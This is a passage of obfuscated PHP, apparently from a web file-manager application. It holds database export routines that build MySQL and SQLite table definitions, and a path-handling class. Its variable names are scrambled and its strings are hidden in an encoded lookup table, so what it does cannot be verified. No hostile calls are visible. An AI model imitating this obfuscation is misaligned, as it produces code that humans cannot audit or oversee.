$„øïÅ½ç[1142]) . $„øïÅ½ç[1143]; preg_match_all($©çá‘Ù´, $ÇËµŸèƒ, $ßıÓóçÅ); $ì½ö©°È = $ßıÓóçÅ[1]; $Ôäã¦ = $this->model()->db(); $÷ªÂĞ¯ü = $Ôäã¦->getTables(); $¥ßòçĞ = TEMP_FILES . $„øïÅ½ç[1144] . date($„øïÅ½ç[257]) . $„øïÅ½ç[8]; del_dir($¥ßòçĞ); mk_dir($¥ßòçĞ); $¶ã“± å = $¥ßòçĞ . $„øïÅ½ç[1145]; $¿‚ãÎøÃ = $¥ßòçĞ . $„øïÅ½ç[1146]; $ãùÁôı˜ = $ÕñûÔ±š == $„øïÅ½ç[13] ? $„øïÅ½ç[851] : $„øïÅ½ç[13]; IO::copy(CONTROLLER_DIR . "\x69\x6e\x73\x74\x61\154\x6c\x2f\144\141\164\141\57{$ãùÁôı˜}\x2e\x73\161\x6c", $¥ßòçĞ); @touch($¥ßòçĞ . $ÕñûÔ±š . $„øïÅ½ç[835]); $õ³Ò§Ş¼ = fopen($¶ã“± å, $„øïÅ½ç[1121]); $Ğï¥˜ö» = fopen($¿‚ãÎøÃ, $„øïÅ½ç[1121]); if ($ÕñûÔ±š == $„øïÅ½ç[13]) { $÷ªÂĞ¯ü = array_diff($÷ªÂĞ¯ü, array($„øïÅ½ç[831], $„øïÅ½ç[832])); $öÊÕ = array($„øïÅ½ç[1147], $„øïÅ½ç[1148], $„øïÅ½ç[1149]); fwrite($Ğï¥˜ö», implode(PHP_EOL, $öÊÕ) . PHP_EOL . PHP_EOL); foreach ($÷ªÂĞ¯ü as $¯°¡ª‘¨) { $ğÏÕ¬ƒ‘ = $this->sqlFromSqlite($¯°¡ª‘¨); if (!$ğÏÕ¬ƒ‘[$„øïÅ½ç[13]]) { continue; } fwrite($Ğï¥˜ö», $ğÏÕ¬ƒ‘[$„øïÅ½ç[13]] . PHP_EOL . PHP_EOL); if (!in_array($¯°¡ª‘¨, $ì½ö©°È)) { fwrite($õ³Ò§Ş¼, $ğÏÕ¬ƒ‘[$„øïÅ½ç[851]] . PHP_EOL . PHP_EOL); } } } else { foreach ($÷ªÂĞ¯ü as $¯°¡ª‘¨) { $ğÏÕ¬ƒ‘ = $this->sqlFromMysql($¯°¡ª‘¨); if (!$ğÏÕ¬ƒ‘[$„øïÅ½ç[851]]) { continue; } fwrite($õ³Ò§Ş¼, $ğÏÕ¬ƒ‘[$„øïÅ½ç[851]] . PHP_EOL . PHP_EOL); if (!in_array($¯°¡ª‘¨, $ì½ö©°È)) { fwrite($Ğï¥˜ö», $ğÏÕ¬ƒ‘[$„øïÅ½ç[13]] . PHP_EOL . PHP_EOL); } } } fclose($õ³Ò§Ş¼); fclose($Ğï¥˜ö»); $ÇËµŸèƒ = array($„øïÅ½ç[851] => $¶ã“± å, $„øïÅ½ç[13] => $¿‚ãÎøÃ); return $¾„ƒÍ½˜ ? $ÇËµŸèƒ[$¾„ƒÍ½˜] : $ÇËµŸèƒ; } public function dbType($¥œïç¨¼ = false) { $­ó¼å™ =& $_SERVER[Î‹ÃÂŞ„]; $’ÖÆÊ = $¥œïç¨¼ ? $GLOBALS[$­ó¼å™[6]][$­ó¼å™[21]] : $this->database; $’ÖÆÊ = array_change_key_case($’ÖÆÊ); $œçú‰éÂ = $’ÖÆÊ[$­ó¼å™[1022]]; if ($œçú‰éÂ == $­ó¼å™[1019]) { $ç²åøË“ = explode($­ó¼å™[4], $’ÖÆÊ[$­ó¼å™[1028]]); $œçú‰éÂ = $ç²åøË“[0]; } $¬–ŒÊŸ¦ = array($­ó¼å™[1150] => $­ó¼å™[13], $­ó¼å™[966] => $­ó¼å™[851]); if (isset($¬–ŒÊŸ¦[$œçú‰éÂ])) { $œçú‰éÂ = $¬–ŒÊŸ¦[$œçú‰éÂ]; } return $œçú‰éÂ; } public function sqlFromMysql($ŒÆğäçê, $£³¶„êÇ = '') { $ÑÉ²ñƒ¹ =& $_SERVER[Î‹ÃÂŞ„]; $‰ÅÍÈëÕ = $this->model()->db(); $Ëº´µ‡¤ = $‰ÅÍÈëÕ->query($ÑÉ²ñƒ¹[1151] . $ŒÆğäçê . $ÑÉ²ñƒ¹[431]); if (!$Ëº´µ‡¤ || !$Ëº´µ‡¤[0]) { return !1; } $ç¦¹¤¡˜ = _get($Ëº´µ‡¤[0], $ÑÉ²ñƒ¹[1152], $ÑÉ²ñƒ¹[12]); if (!$ç¦¹¤¡˜) { return !1; } $òßÃ•Èô = "\104\122\117\120\x20\124\x41\x42\x4c\x45\x20\111\x46\x20\x45\x58\x49\x53\x54\123\x20\x60{$ŒÆğäçê}\x60\x3b" . PHP_EOL . $ç¦¹¤¡˜ . $ÑÉ²ñƒ¹[73]; if ($£³¶„êÇ && $£³¶„êÇ == $ÑÉ²ñƒ¹[851]) { return $òßÃ•Èô; } $ÏËºò = array_change_key_case($GLOBALS[$ÑÉ²ñƒ¹[6]][$ÑÉ²ñƒ¹[21]]); $ÛèÇîÒ‡ = $ÏËºò[$ÑÉ²ñƒ¹[1027]]; $ûˆÕãŞ× = $ÑÉ²ñƒ¹[1153] . $ÛèÇîÒ‡ . $ÑÉ²ñƒ¹[1154] . $ŒÆğäçê . $ÑÉ²ñƒ¹[58]; $ÜØ³ò±¾ = $ÑÉ²ñƒ¹[1155] . $ŒÆğäçê . $ÑÉ²ñƒ¹[954]; $ª˜ÄØü° = $‰ÅÍÈëÕ->query($ûˆÕãŞ×); if (empty($ª˜ÄØü°)) { $¨¾àüÌº = array($ÑÉ²ñƒ¹[851] => $ÑÉ²ñƒ¹[12], $ÑÉ²ñƒ¹[13] => $ÑÉ²ñƒ¹[12]); return $£³¶„êÇ ? $¨¾àüÌº[$£³¶„êÇ] : $¨¾àüÌº; } $ğÇğà™Ç = $‰ÅÍÈëÕ->query($ÜØ³ò±¾); $®¾ü¾£ = $ÑÉ²ñƒ¹[12]; $æµŞáàÖ = array(); foreach ($ğÇğà™Ç as $µúï¯Õ) { if (!$®¾ü¾£ && $µúï¯Õ[$ÑÉ²ñƒ¹[1156]] == $ÑÉ²ñƒ¹[1157]) { $®¾ü¾£ = $µúï¯Õ[$ÑÉ²ñƒ¹[1158]]; } if (isset($æµŞáàÖ[$µúï¯Õ[$ÑÉ²ñƒ¹[1156]]])) { $æµŞáàÖ[$µúï¯Õ[$ÑÉ²ñƒ¹[1156]]][$ÑÉ²ñƒ¹[1159]][] = $µúï¯Õ[$ÑÉ²ñƒ¹[1158]]; continue; } $æµŞáàÖ[$µúï¯Õ[$ÑÉ²ñƒ¹[1156]]] = array($ÑÉ²ñƒ¹[1160] => $µúï¯Õ[$ÑÉ²ñƒ¹[1156]], $ÑÉ²ñƒ¹[1159] => array($µúï¯Õ[$ÑÉ²ñƒ¹[1158]]), $ÑÉ²ñƒ¹[1161] => $µúï¯Õ[$ÑÉ²ñƒ¹[1162]] == $ÑÉ²ñƒ¹[90] ? 0 : 1); } $Ö°ÛÑË = array(); foreach ($æµŞáàÖ as $µúï¯Õ) { $ğŒ¨½Ñ· = $µúï¯Õ[$ÑÉ²ñƒ¹[1160]] == $ÑÉ²ñƒ¹[1157]; $õ„˜Øªœ = array($ÑÉ²ñƒ¹[1163], $µúï¯Õ[$ÑÉ²ñƒ¹[1161]] == $ÑÉ²ñƒ¹[90] && !$ğŒ¨½Ñ· ? $ÑÉ²ñƒ¹[1164] : $ÑÉ²ñƒ¹[12], $ÑÉ²ñƒ¹[1165], $ÑÉ²ñƒ¹[1166] . $ŒÆğäçê . $ÑÉ²ñƒ¹[11] . ($ğŒ¨½Ñ· ? $ÑÉ²ñƒ¹[1167] : $µúï¯Õ[$ÑÉ²ñƒ¹[1160]]) . $ÑÉ²ñƒ¹[120], $ÑÉ²ñƒ¹[1168], $ÑÉ²ñƒ¹[120] . $ŒÆğäçê . $ÑÉ²ñƒ¹[120], $ÑÉ²ñƒ¹[1169] . implode($ÑÉ²ñƒ¹[1170], $µúï¯Õ[$ÑÉ²ñƒ¹[1159]]) . $ÑÉ²ñƒ¹[1171]); $Ö°ÛÑË[] = implode($ÑÉ²ñƒ¹[53], $õ„˜Øªœ) . $ÑÉ²ñƒ¹[73]; } $¡…œíÉ = array(); $›Ÿığíš = array($ÑÉ²ñƒ¹[1172] => $ÑÉ²ñƒ¹[1173], $ÑÉ²ñƒ¹[1173] => $ÑÉ²ñƒ¹[1173], $ÑÉ²ñƒ¹[334] => $ÑÉ²ñƒ¹[361], $ÑÉ²ñƒ¹[333] => $ÑÉ²ñƒ¹[361]); foreach ($ª˜ÄØü° as $µúï¯Õ) { $õ„˜Øªœ = array($ÑÉ²ñƒ¹[120] . $µúï¯Õ[$ÑÉ²ñƒ¹[1174]] . $ÑÉ²ñƒ¹[120], isset($›Ÿığíš[$µúï¯Õ[$ÑÉ²ñƒ¹[1175]]]) ? $›Ÿığíš[$µúï¯Õ[$ÑÉ²ñƒ¹[1175]]] : $µúï¯Õ[$ÑÉ²ñƒ¹[1176]], $µúï¯Õ[$ÑÉ²ñƒ¹[1177]] == $ÑÉ²ñƒ¹[952] ? $ÑÉ²ñƒ¹[1178] : $ÑÉ²ñƒ¹[1179], $µúï¯Õ[$ÑÉ²ñƒ¹[1174]] == $®¾ü¾£ ? $ÑÉ²ñƒ¹[1180] : $ÑÉ²ñƒ¹[12], $µúï¯Õ[$ÑÉ²ñƒ¹[1003]] ? strtoupper(str_replace($ÑÉ²ñƒ¹[11], $ÑÉ²ñƒ¹[12], $µúï¯Õ[$ÑÉ²ñƒ¹[1003]])) : $ÑÉ²ñƒ¹[12]); $¡…œíÉ[] = trim(implode($ÑÉ²ñƒ¹[53], $õ„˜Øªœ)); } $‹‚€¯¸ê = array($ÑÉ²ñƒ¹[1181] . $ŒÆğäçê . $ÑÉ²ñƒ¹[1182], $ÑÉ²ñƒ¹[1183] . $ŒÆğäçê . $ÑÉ²ñƒ¹[1184], implode($ÑÉ²ñƒ¹[50] . PHP_EOL, $¡…œíÉ), $ÑÉ²ñƒ¹[1000]); $ŞŒ¥˜ëî = implode(PHP_EOL, array_merge($‹‚€¯¸ê, $Ö°ÛÑË)); if ($£³¶„êÇ && $£³¶„êÇ == $ÑÉ²ñƒ¹[13]) { return $ŞŒ¥˜ëî; } $¨¾àüÌº = array($ÑÉ²ñƒ¹[851] => $òßÃ•Èô, $ÑÉ²ñƒ¹[13] => $ŞŒ¥˜ëî); return $£³¶„êÇ ? $¨¾àüÌº[$£³¶„êÇ] : $¨¾àüÌº; } public function sqlFromSqlite($µŠÒ°íŠ, $œå£†ş = '') { $îØŒ‡Üå =& $_SERVER[Î‹ÃÂŞ„]; $›ì¤¢„¡ = $this->model()->db(); $”¨şÙÍ– = "\120\122\101\107\115\101\40\124\x41\x42\114\105\137\x49\116\106\117\40\50\x27{$µŠÒ°íŠ}\x27\51"; $ú‡ä½î¦ = "\123\105\114\x45\103\124\40\x2a\40\x46\x52\117\x4d\40\163\x71\154\x69\164\145\137\x6d\141\x73\164\145\162\40\127\x48\105\x52\105\x20\x74\142\x6c\x5f\156\x61\x6d\x65\x20\x3d\40\47{$µŠÒ°íŠ}\47"; $¬©»› = $›ì¤¢„¡->query($”¨şÙÍ–); if (empty($¬©»›)) { $ìºõùÓÎ = array($îØŒ‡Üå[851] => $îØŒ‡Üå[12], $îØŒ‡Üå[13] => $îØŒ‡Üå[12]); return $œå£†ş ? $ìºõùÓÎ[$œå£†ş] : $ìºõùÓÎ; } $À¨û¡†¶ = $›ì¤¢„¡->query($ú‡ä½î¦); $Óê’Ÿçù = $Ì¼´Ù…ƒ = array(); foreach ($À¨û¡†¶ as $´Íüõ­) { if ($´Íüõ­[$îØŒ‡Üå[33]] == $îØŒ‡Üå[325]) { $Óê’Ÿçù[] = $´Íüõ­[$îØŒ‡Üå[1185]]; } else { $Ì¼´Ù…ƒ[$´Íüõ­[$îØŒ‡Üå[32]]] = $´Íüõ­[$îØŒ‡Üå[1185]]; } } $”ÄáÉµ÷ = array_merge(array($îØŒ‡Üå[1181] . $µŠÒ°íŠ . $îØŒ‡Üå[120]), $Óê’Ÿçù, array_values($Ì¼´Ù…ƒ)); $”ÄáÉµ÷ = implode($îØŒ‡Üå[73] . PHP_EOL, $”ÄáÉµ÷) . $îØŒ‡Üå[73]; if ($œå£†ş && $œå£†ş == $îØŒ‡Üå[13]) { return $”ÄáÉµ÷; } $‘çï•‰Ì = array(); $Îå¸Õ† = array($îØŒ‡Üå[1173] => $îØŒ‡Üå[1186], $îØŒ‡Üå[361] => $îØŒ‡Üå[1187]); $¯ñµâÃë = $îØŒ‡Üå[12]; foreach ($¬©»› as $´Íüõ­) { if ($´Íüõ­[$îØŒ‡Üå[57]] == $îØŒ‡Üå[90]) { $¯ñµâÃë = $´Íüõ­[$îØŒ‡Üå[32]]; } $°ªâ¼¼ = array($îØŒ‡Üå[431] . $´Íüõ­[$îØŒ‡Üå[32]] . $îØŒ‡Üå[431], isset($Îå¸Õ†[$´Íüõ­[$îØŒ‡Üå[33]]]) ? $Îå¸Õ†[$´Íüõ­[$îØŒ‡Üå[33]]] : $´Íüõ­[$îØŒ‡Üå[33]], $´Íüõ­[$îØŒ‡Üå[35]] == $îØŒ‡Üå[90] ? $îØŒ‡Üå[1178] : $îØŒ‡Üå[1188] . $´Íüõ­[$îØŒ‡Üå[56]], $´Íüõ­[$îØŒ‡Üå[57]] == $îØŒ‡Üå[90] ? $îØŒ‡Üå[1189] : $îØŒ‡Üå[12]); $‘çï•‰Ì[] = trim(implode($îØŒ‡Üå[53], $°ªâ¼¼)); } foreach ($Ì¼´Ù…ƒ as $‚Ú”èå» => $ˆ­ººÆä) { $šÚÃœ¥Õ = str_replace($îØŒ‡Üå[1190] . $µŠÒ°íŠ . $îØŒ‡Üå[11], $îØŒ‡Üå[12], $‚Ú”èå»); $°Â¦èœ³ = str_replace(array($îØŒ‡Üå[120], $îØŒ‡Üå[1011]), $îØŒ‡Üå[431], substr($ˆ­ººÆä, stripos($ˆ­ººÆä, $îØŒ‡Üå[306]))); if ($šÚÃœ¥Õ == $îØŒ‡Üå[1167]) { $ÙğÓ¼Ì = $îØŒ‡Üå[1191] . $¯ñµâÃë . $îØŒ‡Üå[1192]; } else { $ÙğÓ¼Ì = (stripos($šÚÃœ¥Õ, $îØŒ‡Üå[11]) ? $îØŒ‡Üå[1193] : $îØŒ‡Üå[12]) . ($îØŒ‡Üå[1194] . $šÚÃœ¥Õ . $îØŒ‡Üå[1195] . $°Â¦èœ³); } $‘çï•‰Ì[] = $ÙğÓ¼Ì; } $ŞàèÚòü = array($îØŒ‡Üå[1196] . $µŠÒ°íŠ . $îØŒ‡Üå[1197], $îØŒ‡Üå[1198] . $µŠÒ°íŠ . $îØŒ‡Üå[1199], implode($îØŒ‡Üå[50] . PHP_EOL, $‘çï•‰Ì), $îØŒ‡Üå[1200]); $ÉŠ²Ê» = implode(PHP_EOL, $ŞàèÚòü); if ($œå£†ş && $œå£†ş == $îØŒ‡Üå[851]) { return $ÉŠ²Ê»; } $ìºõùÓÎ = array($îØŒ‡Üå[851] => $ÉŠ²Ê», $îØŒ‡Üå[13] => $”ÄáÉµ÷); return $œå£†ş ? $ìºõùÓÎ[$œå£†ş] : $ìºõùÓÎ; } } goto eøƒ÷…®ÓŸ; cĞˆ¬ßøå: class KodIO { const KOD_SOURCE = "\x7b\163\157\x75\x72\143\145\x7d"; const KOD_USER_RECYCLE = "\x7b\x75\163\x65\x72\122\145\143\x79\x63\154\145\175"; const KOD_USER_FAV = "\x7b\x75\163\x65\x72\106\141\x76\175"; const KOD_USER_FILE_TAG = "\173\x75\163\x65\162\106\151\x6c\145\x54\141\x67\175"; const KOD_USER_FILE_TYPE = "\173\165\x73\x65\x72\x46\x69\x6c\x65\x54\x79\x70\145\175"; const KOD_GROUP_ROOT_SELF = "\173\x67\x72\157\165\x70\x52\157\x6f\164\x53\145\x6c\x66\175"; const KOD_USER_SHARE = "\173\165\163\x65\162\123\150\x61\x72\x65\x7d"; const KOD_USER_SHARE_LINK = "\173\165\163\x65\162\x53\150\x61\162\x65\x4c\x69\156\x6b\175"; const KOD_USER_SHARE_TO_ME = "\173\x73\x68\x61\x72\x65\x54\157\x4d\x65\x7d"; const KOD_SHARE_ITEM = "\x7b\163\x68\x61\x72\x65\x49\164\145\x6d\x7d"; const KOD_SHARE_LINK = "\173\163\x68\x61\162\145\x49\x74\145\155\x4c\x69\x6e\x6b\175"; const KOD_SEARCH = "\173\163\145\x61\x72\x63\150\175"; const KOD_BLOCK = "\x7b\142\154\x6f\x63\153\175"; const KOD_IO = "\173\x69\157\x7d"; const KOD_USER_RECENT = "\x7b\x75\163\145\x72\x52\145\x6e\x63\x65\156\x74\175"; const KOD_USER_DRIVER = "\173\144\162\x69\166\x65\162\x7d"; public static function typeList() { $Ô÷©¦’ =& $_SERVER[Î‹ÃÂŞ„]; return array($Ô÷©¦’[1306] => self::KOD_SOURCE, $Ô÷©¦’[1307] => self::KOD_USER_RECYCLE, $Ô÷©¦’[1308] => self::KOD_USER_FAV, $Ô÷©¦’[1309] => self::KOD_USER_FILE_TAG, $Ô÷©¦’[1310] => self::KOD_USER_FILE_TYPE, $Ô÷©¦’[1311] => self::KOD_GROUP_ROOT_SELF, $Ô÷©¦’[1312] => self::KOD_USER_SHARE, $Ô÷©¦’[1313] => self::KOD_USER_SHARE_LINK, $Ô÷©¦’[1314] => self::KOD_USER_SHARE_TO_ME, $Ô÷©¦’[1315] => self::KOD_SHARE_ITEM, $Ô÷©¦’[1316] => self::KOD_SHARE_LINK, $Ô÷©¦’[1317] => self::KOD_SEARCH, $Ô÷©¦’[1318] => self::KOD_BLOCK, $Ô÷©¦’[1319] => self::KOD_IO, $Ô÷©¦’[1320] => self::KOD_USER_RECENT, $Ô÷©¦’[1321] => self::KOD_USER_DRIVER); } public static function parse($ÌÊÔ¾¤ú) { $Œâäú´ =& $_SERVER[Î‹ÃÂŞ„]; $ÌÊÔ¾¤ú = self::clear($ÌÊÔ¾¤ú); $ºÉÒ ı = array_values(self::typeList()); preg_match($Œâäú´[1322], $ÌÊÔ¾¤ú, $í­õ©ô); $”¢›¼æ‹ = array($Œâäú´[466] => !1, $Œâäú´[1323] => !1, $Œâäú´[463] => !1, $Œâäú´[86] => $ÌÊÔ¾¤ú, $Œâäú´[1224] => !1, $Œâäú´[1223] => $Œâäú´[12]); if (is_array($í­õ©ô) && count($í­õ©ô) == 5) { $¦‚ÆÅ­È = $Œâäú´[1324] . $í­õ©ô[2] . $Œâäú´[373]; if (in_array($¦‚ÆÅ­È, $ºÉÒ ı)) { $”¢›¼æ‹[$Œâäú´[1224]] = $í­õ©ô[1]; $”¢›¼æ‹[$Œâäú´[33]] = $¦‚ÆÅ­È; $”¢›¼æ‹[$Œâäú´[1325]] = substr($¦‚ÆÅ­È, 1, -1); $”¢›¼æ‹[$Œâäú´[445]] = $í­õ©ô[3]; } $”¢›¼æ‹[$Œâäú´[1223]] = $í­õ©ô[4]; } $·§¡¬Ï¿ = array($Œâäú´[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $”¢›¼æ‹[$Œâäú´[1288]] = in_array($”¢›¼æ‹[$Œâäú´[33]], $·§¡¬Ï¿); return $”¢›¼æ‹; } public static function isTruePath($›¨³¨“ˆ) { $“¸ÄÇØ =& $_SERVER[Î‹ÃÂŞ„]; if (substr($›¨³¨“ˆ, 0, 1) != $“¸ÄÇØ[1324]) { return !0; } if (strpos($›¨³¨“ˆ, $“¸ÄÇØ[453]) === 0) { return !0; } if (strpos($›¨³¨“ˆ, $“¸ÄÇØ[1292]) === 0) { return !0; } if (strpos($›¨³¨“ˆ, $“¸ÄÇØ[1326]) === 0) { return !0; } if (strpos($›¨³¨“ˆ, $“¸ÄÇØ[1327]) === 0) { return !0; } if (strpos($›¨³¨“ˆ, $“¸ÄÇØ[1328]) === 0) { return !0; } return !1; } public static function clear($‘Îé©Ú) { $½˜å…€ =& $_SERVER[Î‹ÃÂŞ„]; $‘Îé©Ú = str_replace(array($½˜å…€[1133], $½˜å…€[248]), $½˜å…€[53], $‘Îé©Ú); $‘Îé©Ú = str_replace($½˜å…€[99], $½˜å…€[8], $‘Îé©Ú); $Íè×»áÒ = $½˜å…€[1329]; if (substr($‘Îé©Ú, 0, 3) == $½˜å…€[1330]) { $‘Îé©Ú = substr($‘Îé©Ú, 3); } while (strstr($‘Îé©Ú, $Íè×»áÒ)) { $‘Îé©Ú = str_replace($Íè×»áÒ, $½˜å…€[8], $‘Îé©Ú); } $‘Îé©Ú = preg_replace($½˜å…€[1331], $½˜å…€[8], $‘Îé©Ú); if ($‘Îé©Ú == $½˜å…€[8]) { return $½˜å…€[8]; } $‘Îé©Ú = rtrim($‘Îé©Ú, $½˜å…€[8]); return $‘Îé©Ú; } public static function pathTrue($„Ø™ÈÃ£) { $’§ÎüÓ =& $_SERVER[Î‹ÃÂŞ„]; if (!$„Ø™ÈÃ£) { return $’§ÎüÓ[12]; } $„Ø™ÈÃ£ = str_replace($’§ÎüÓ[564], $’§ÎüÓ[8], str_replace($’§ÎüÓ[1332], $’§ÎüÓ[8], $„Ø™ÈÃ£)); $„Ø™ÈÃ£ = str_replace($’§ÎüÓ[564], $’§ÎüÓ[8], str_replace($’§ÎüÓ[1332], $’§ÎüÓ[8], $„Ø™ÈÃ£)); if (!strstr($„Ø™ÈÃ£, $’§ÎüÓ[1330])) { return $„Ø™ÈÃ£; } $µÊ¬éé· = explode($’§ÎüÓ[8], $„Ø™ÈÃ£); foreach ($µÊ¬éé· as $ô¢ÂÚÅâ => $¾üœÆ˜ß) { if ($¾üœÆ˜ß !== $’§ÎüÓ[1333]) { continue; } for ($ŠÖÂ¿’Ğ = $ô¢ÂÚÅâ; $ŠÖÂ¿’Ğ >= 0; $ŠÖÂ¿’Ğ--) { if ($µÊ¬éé·[$ŠÖÂ¿’Ğ] === $’§ÎüÓ[10] || $µÊ¬éé·[$ŠÖÂ¿’Ğ] === $’§ÎüÓ[1333] || $µÊ¬éé·[$ŠÖÂ¿’Ğ] === -1) { continue; } if ($µÊ¬éé·[$ŠÖÂ¿’Ğ] === $’§ÎüÓ[12]) { $µÊ¬éé·[$ô¢ÂÚÅâ] = -1; break; } $µÊ¬éé·[$ô¢ÂÚÅâ] = -1; $µÊ¬éé·[$ŠÖÂ¿’Ğ] = -1; break; } } $È¨çƒÔ® = array(); foreach ($µÊ¬éé· as $¾üœÆ˜ß) { if ($¾üœÆ˜ß !== -1) { $È¨çƒÔ®[] = $¾üœÆ˜ß; } } $‚æ¸º®¼ = implode($’§ÎüÓ[8], $È¨çƒÔ®); if (strpos($‚æ¸º®¼, $’§ÎüÓ[1334]) === 0) { $‚æ¸º®¼ = $’§ÎüÓ[1330] . substr($‚æ¸º®¼, strlen($’§ÎüÓ[1334])); } return $‚æ¸º®¼; } public static function sourceID($œ¨Ëã‚¶) { $¨€ü¶° =& $_SERVER[Î‹ÃÂŞ„]; $Åè¿¢“  = self::parse($œ¨Ëã‚¶); if ($Åè¿¢“ [$¨€ü¶°[33]] !== self::KOD_SOURCE) { show_json(LNG($¨€ü¶°[1335]), !1); } return $Åè¿¢“ [$¨€ü¶°[445]]; } public static function make($ÁáÒ‰Õ³) { if (!$ÁáÒ‰Õ³) { return !1; } return self::makePath(self::KOD_SOURCE, intval($ÁáÒ‰Õ³)); } public static function makeShare($—ïà¤²é, $ĞÍ‘¦Ó”) { return self::makePath(self::KOD_SHARE_ITEM, $—ïà¤²é, $ĞÍ‘¦Ó”); } public static function makeFileTypePath($¦¥ü¦Ğò) { return self::makePath(self::KOD_USER_FILE_TYPE, $¦¥ü¦Ğò); } public static function makeFileTagPath($ôÛ÷õ²) { return self::makePath(self::KOD_USER_FILE_TAG, $ôÛ÷õ²); } public static function makePath($â‚ÎÖîÌ, $“Ğš¯¢› = '', $âœáÎÖÍ = '') { $‘·ÄëçÔ =& $_SERVER[Î‹ÃÂŞ„]; $øÊÏŠÂå = substr($â‚ÎÖîÌ, 1, -1); $ÅåóÔ‰É = $‘·ÄëçÔ[1336] . $øÊÏŠÂå . $‘·ÄëçÔ[1337] . $“Ğš¯¢› . $‘·ÄëçÔ[1338]; $ÅåóÔ‰É = $âœáÎÖÍ ? $ÅåóÔ‰É . $âœáÎÖÍ . $‘·ÄëçÔ[8] : $ÅåóÔ‰É; return $ÅåóÔ‰É; } public static function hashPath($š®É¶¤ä, $¡Îò«ŒÓ = true) { $ş†³½½° =& $_SERVER[Î‹ÃÂŞ„]; $É²ÚÛ¡Œ = is_array($š®É¶¤ä) ? $š®É¶¤ä : IO::info($š®É¶¤ä); $şòğ©•î = _get($É²ÚÛ¡Œ, $ş†³½½°[1339], $ş†³½½°[12]); if (!$şòğ©•î && isset($É²ÚÛ¡Œ[$ş†³½½°[221]])) { $şòğ©•î = trim($É²ÚÛ¡Œ[$ş†³½½°[221]], $ş†³½½°[120]); } if (!$şòğ©•î && isset($É²ÚÛ¡Œ[$ş†³½½°[183]]) && $É²ÚÛ¡Œ[$ş†³½½°[183]]) { $É²ÚÛ¡Œ = IO::info(KodIO::make($É²ÚÛ¡Œ[$ş†³½½°[183]])); $şòğ©•î = _get($É²ÚÛ¡Œ, $ş†³½½°[1339], $ş†³½½°[12]); } $ãÜ¹´† = md5($É²ÚÛ¡Œ[$ş†³½½°[86]] . $É²ÚÛ¡Œ[$ş†³½½°[78]] . $É²ÚÛ¡Œ[$ş†³½½°[87]]); if (!$şòğ©•î && file_exists($É²ÚÛ¡Œ[$ş†³½½°[86]])) { $şòğ©•î = Cache::get($ãÜ¹´† . $ş†³½½°[1340]); $şòğ©•î = !1; if (!$şòğ©•î) { $şòğ©•î = IO::hashSimple($É²ÚÛ¡Œ[$ş†³½½°[86]]); Cache::set($ãÜ¹´† . $ş†³½½°[1340], $şòğ©•î, 3600 * 24 * 30); } } if ($¡Îò«ŒÓ && !$şòğ©•î) { } return $şòğ©•î ? $şòğ©•î : $ãÜ¹´†; } public static function hashPathSafe($‡äÊĞªİ, $ìùøŠõ² = true) { $ÒÜæçÎ¦ =& $_SERVER[Î‹ÃÂŞ„]; $™Ï¤ÏíÁ = self::hashPath($‡äÊĞªİ, $ìùøŠõ²); return md5($™Ï¤ÏíÁ . $ÒÜæçÎ¦[1341] . Model($ÒÜæçÎ¦[817])->get($ÒÜæçÎ¦[818])); } public static function initSystemPath() { $ŞøÂÌûî =& $_SERVER[Î‹ÃÂŞ„]; if (defined($ŞøÂÌûî[1342])) { return; } define($ŞøÂÌûî[1342], self::systemPath($ŞøÂÌûî[181])); define($ŞøÂÌûî[1343], self::systemPath($ŞøÂÌûî[1344])); define($ŞøÂÌûî[1345], self::systemPath($ŞøÂÌûî[1346])); define($ŞøÂÌûî[1347], self::systemPath($ŞøÂÌûî[1348])); IOHistory::bindEvent(); } public static function systemPath($–çÜµ) { $ÉİÚèş„ =& $_SERVER[Î‹ÃÂŞ„]; $ªÏÛæïì = $ÉİÚèş„[1349] . ucfirst($–çÜµ); $ì½œß˜˜ = Model($ÉİÚèş„[817])->get($ªÏÛæïì); if ($ì½œß˜˜) { return $ì½œß˜˜; } if ($–çÜµ == $ÉİÚèş„[181]) { $ì½œß˜˜ = self::make(Model($ÉİÚèş„[872])->systemRootPathAdd($ÉİÚèş„[577])); } else { $ì½œß˜˜ = self::systemPath($ÉİÚèş„[181]); $‰ªè¤Ç = self::sourceID($ì½œß˜˜); $ì½œß˜˜ = self::make(Model($ÉİÚèş„[872])->mkdir($‰ªè¤Ç, $–çÜµ)); } Model($ÉİÚèş„[817])->set($ªÏÛæïì, $ì½œß˜˜); return $ì½œß˜˜; } public static function systemFolder($÷âøşÆÍ) { $¥ÉåÏˆş = IO_PATH_SYSTEM_SOURCE . $÷âøşÆÍ; $Š¥†¦»ï = Cache::get($¥ÉåÏˆş); if (!$Š¥†¦»ï) { $Â½¯ÀÚù = IO::infoFullSimple($¥ÉåÏˆş); if (!$Â½¯ÀÚù) { $Š¥†¦»ï = IO::mkdir($¥ÉåÏˆş, REPEAT_SKIP); } else { $Š¥†¦»ï = $Â½¯ÀÚù[$_SERVER[Î‹ÃÂŞ„][86]]; } Cache::set($¥ÉåÏˆş, $Š¥†¦»ï, 3600 * 10); } return $Š¥†¦»ï; } public static function defaultDriver() { return Model($_SERVER[Î‹ÃÂŞ„][814])->defaultDriver(); } public static function defaultIO() { $³ğñã—Õ =& $_SERVER[Î‹ÃÂŞ„]; $º„¾ÑÄ‹ = self::defaultDriver(); return $³ğñã—Õ[1350] . $º„¾ÑÄ‹[$³ğñã—Õ[445]] . $³ğñã—Õ[1338]; } public static function defaultDriverInit() { static $û¹ˆÉ¦Ê = false; if ($û¹ˆÉ¦Ê) { return $û¹ˆÉ¦Ê; } $û¹ˆÉ¦Ê = IO::init(self::defaultIO()); return $û¹ˆÉ¦Ê; } public static function fileTypeList() { $×¼ìà´ =& $_SERVER[Î‹ÃÂŞ„]; $ú†—’š† = $GLOBALS[$×¼ìà´[6]][$×¼ìà´[1351]]; foreach ($ú†—’š† as $ÅÓŸğÈ => $®¶ìªóø) { $îÎËŞÏ¤ = $×¼ìà´[1352] . $ÅÓŸğÈ; $şÈ¯ğ÷ = LNG($îÎËŞÏ¤); if ($îÎËŞÏ¤ != $şÈ¯ğ÷) { $ú†—’š†[$ÅÓŸğÈ][$×¼ìà´[32]] = $şÈ¯ğ÷; } } return $ú†—’š†; } public static function diskList($µÔ¯„ƒ = true) { $ê†Ê†† = $_SERVER[Î‹ÃÂŞ„][1353]; if ($µÔ¯„ƒ) { $„ÎÔâ½‘ = Cache::get($ê†Ê††); if (is_array($„ÎÔâ½‘)) { return 